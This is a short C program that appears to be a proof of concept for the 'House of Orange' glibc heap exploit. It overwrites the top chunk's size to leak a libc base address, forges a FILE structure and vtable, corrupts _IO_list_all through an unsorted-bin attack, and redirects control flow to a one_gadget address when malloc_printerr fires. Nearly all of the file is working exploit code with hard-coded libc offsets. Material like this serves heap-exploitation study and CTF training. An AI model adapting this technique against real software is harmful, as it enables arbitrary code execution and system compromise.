#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#define _IO_list_all 0x3c5520
#define one_gadget 0xf1247

char fake_vtable[0xa8];

int main() {
    void *p;
    void *fake_file;

    p = malloc(0x18);
    *(uint64_t *)((uint64_t) p + 0x18) = 0xfe1; // Set top chunk's size = 0xfe1
    malloc(0x1000); // Trigger sysmalloc (free top chunk)
    p = malloc(0x500); // Get a unsortedbin-chunk
    uint64_t libc_base = (uint64_t)(*(uint64_t *) p) - 0x3c5188;
    fprintf(stderr, "leak libc => %p\n", (void *) libc_base);

    uint64_t unsorted_bin_chunk_addr = (uint64_t) p + 0x500;
    fake_file = (void *) unsorted_bin_chunk_addr;
    uint64_t IO_list_all_addr = libc_base + _IO_list_all;

    // Create fake file (also a fake smallbin)
    *(uint64_t *)((uint64_t) fake_file + 0x8) = 0x61; // _IO_read_ptr ; Set smallbin's size ; Fake _chain @ `&unsortedbin + 0x68`
    *(uint64_t *)((uint64_t) fake_file + 0x18) = IO_list_all_addr - 0x10; // _IO_read_base ; For Unsoredbin Attack
    // Bypass _IO_overflow_t
    *(uint64_t *)((uint64_t) fake_file + 0xc0) = 0; // _mode
    *(uint64_t *)((uint64_t) fake_file + 0x28) = 1; // _IO_write_ptr
    *(uint64_t *)((uint64_t) fake_file + 0x20) = 0; // _IO_write_base
    *(uint64_t *)((uint64_t) fake_file + 0xd8) = (uint64_t) fake_vtable; // vtable
    uint64_t one_gadget_addr = libc_base + one_gadget;
    *(uint64_t *)((uint64_t) fake_vtable + 0x18) = one_gadget_addr; // __overflow
    malloc(1); // Trigger malloc_printerr
}
